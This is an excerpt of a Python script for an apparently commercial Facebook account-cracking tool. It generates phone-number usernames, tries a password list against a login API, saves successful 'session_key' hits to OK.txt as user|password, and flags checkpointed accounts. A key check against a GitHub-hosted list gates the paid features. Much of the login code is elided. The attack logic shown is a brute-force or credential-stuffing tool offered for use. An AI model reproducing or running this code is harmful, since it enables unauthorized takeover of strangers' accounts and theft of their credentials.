...
def banner():
	...
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Owner   : %sLx Ariyan Chowdhury           %s║"%(Z,B,M,Z))
	print("%s║%s  Youtube : Lx Ariyan Chowdhury           %s║"%(Z,B,Z))
	print("%s║%s  Version  : %s0.7                          %s║"%(Z,B,H,Z))
	print("%s╚══════════════════════════════════════════╝"%(Z))
	print("")
	xox('            %s》%s》%s》%sSORRY FOR HATE YOU%s《%s《%s《'%(M,H,B,H,B,H,M))
	print("")
...
def ariyan():
	os.system('clear')
	banner()
	print(f' {H}[1]RANDOM NUMBER CR3K')
	print(f' {M}[B]BACK\n')
...
def random_number():
	...
	os.system('clear')
	banner()
	print(f"          {FM}Enter Your Phone Number{N}\n")
	print(f" {M}FOR EXAMPLE : {Z}[{H} 01887667887 {Z}]\n")
	fkode = input(f'{K} INPUT NUMBER : {H}')
	if len(fkode) < 10:
	...
	try:
		for pw in pwx:
			...
			if "session_key" in result:
				print('\033[1;32m [OK] '+user+'|'+pw+'\033[0;97m')
				open('OK.txt', 'a').write(user+'|'+pw+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result["error_msg"]:
				print(result)
				print('\033[1;31m [CP] '+user+'|'+pw+'\033[0;97m')
...
def Subscraption():
	...
	print(banner)
	r1=requests.get("https://raw.githubusercontent.com/lxariyanchowdhury/Alex_Paid/main/IP.txt").text
	if key1 in r1:
		os.system('clear')
		print(banner)
		Main()
		...
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'
